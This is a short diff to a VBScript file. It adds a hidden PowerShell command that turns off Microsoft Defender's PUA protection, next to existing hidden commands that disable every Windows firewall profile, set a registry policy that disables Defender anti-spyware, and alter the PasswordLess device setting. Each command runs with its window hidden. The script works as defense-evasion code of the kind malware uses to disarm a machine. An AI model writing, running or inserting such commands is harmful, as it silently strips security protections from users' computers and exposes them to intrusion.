@@ -1,4 +1,5 @@
 Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -Command Set-MpPreference -PUAProtection 0", 0, True
 objShell.Run "powershell.exe -Command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False", 0, True
 objShell.Run "powershell.exe -Command reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f", 0, True
 objShell.Run "powershell.exe -Command reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f", 0, True
